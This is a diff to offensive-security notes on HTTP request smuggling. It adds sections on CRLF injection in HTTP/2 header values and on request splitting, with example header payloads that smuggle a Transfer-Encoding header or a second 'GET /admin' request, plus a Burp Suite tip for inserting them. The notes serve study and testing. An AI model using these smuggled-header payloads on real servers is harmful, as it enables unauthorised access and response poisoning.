@@ -26,6 +26,8 @@ HTTP request smuggling is a server-side attack that takes advantage of discrepan
     - [H2.CL vulnerabilities](#h2cl)
     - [H2.TE vulnerabilities](#h2te-vulnerabilities)
     - [Response queue poisoning](#response-queue-poisoning)
+    - [Request smuggling via CRLF injection](#request-smuggling-via-crlf-injection)
+    - [Request splitting](#request-splitting)
 
 ## Explanation
 
@@ -581,10 +583,10 @@ HTTP2 Front-end
 
 header | value
 --- | ---
-:method |	`POST`
-:path |	`/example`
-:authority |	`vulnerable-website.com`
-content-type |	`application/x-www-form-urlencoded`
+:method | `POST`
+:path | `/example`
+:authority | `vulnerable-website.com`
+content-type | `application/x-www-form-urlencoded`
 content-length | `0`
 
 body:
@@ -618,10 +620,10 @@ HTTP2 Front-end
 
 header | value
 --- | ---
-:method |	`POST`
-:path |	`/example`
-:authority |	`vulnerable-website.com`
-content-type |	`application/x-www-form-urlencoded`
+:method | `POST`
+:path | `/example`
+:authority | `vulnerable-website.com`
+content-type | `application/x-www-form-urlencoded`
 transfer-encoding | `chunked`
 
 body:
@@ -684,6 +686,38 @@ Host: vuln.net
 ```
 
 This respond not found and return a not found to the next request, the idea is to be the third request to catch the answer of the victim request.
+
+### Request smuggling via CRLF injection
+
+Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.
+
+On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that \r\n no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split:
+
+```
+foo	bar\r\nTransfer-Encoding: chunked
+```
+
+This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the \r\n will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:
+
+```
+Foo: bar
+Transfer-Encoding: chunked
+```
+
+:warning: to write `\r\n` in HTTP header in burpsuite, you need to go on inspector -> Request headers -> and modifie the value -> add `\r\n` by pressing SHIFT + ENTER.
+
+### Request splitting
+
+With [response queue poisoning](#response-queue-poisoning) we saw how split the request in two in the body section, but we can do it in headers too:
+
+header | value
+--- | ---
+:method | `GET`
+:path | `/example`
+:authority | `vulnerable-website.com`
+foo | `bar\r\n\r\nGET /admin HTTP/1.1\r\nHost:vulnerable-website.com`
+
+This is useful in cases where the content-length is validated and the back-end doesn't support chunked encoding.
 
 ---
 
